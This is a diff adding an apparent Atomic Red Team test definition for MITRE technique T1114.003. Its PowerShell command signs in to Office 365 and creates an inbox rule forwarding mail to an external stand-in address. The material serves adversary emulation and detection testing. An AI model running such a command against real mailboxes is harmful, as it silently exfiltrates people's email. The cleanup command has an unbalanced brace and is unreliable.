@@ -1,0 +1,49 @@
+{
+  "attack_technique": "T1114.003",
+  "display_name": "Email Collection: Email Forwarding Rule",
+  "atomic_tests": [
+    {
+      "name": "Office365 - Email Forwarding",
+      "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.",
+      "supported_platforms": [
+        "office-365"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"",
+        "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }"
+      },
+      "input_arguments": {
+        "username": {
+          "description": "office-365 username",
+          "type": "string",
+          "default": null
+        },
+        "password": {
+          "description": "office-365 password",
+          "type": "string",
+          "default": null
+        },
+        "rule_name": {
+          "description": "email rule name",
+          "type": "string",
+          "default": "Atomic Red Team Email Rule"
+        },
+        "forwarding_email": {
+          "description": "destination email addresses",
+          "type": "string",
+          "default": "Atomic_Operator@fakeemail.aq"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license.",
+          "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}",
+          "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement"
+        }
+      ],
+      "auto_generated_guid": "3234117e-151d-4254-9150-3d0bac41e38c"
+    }
+  ]
+}
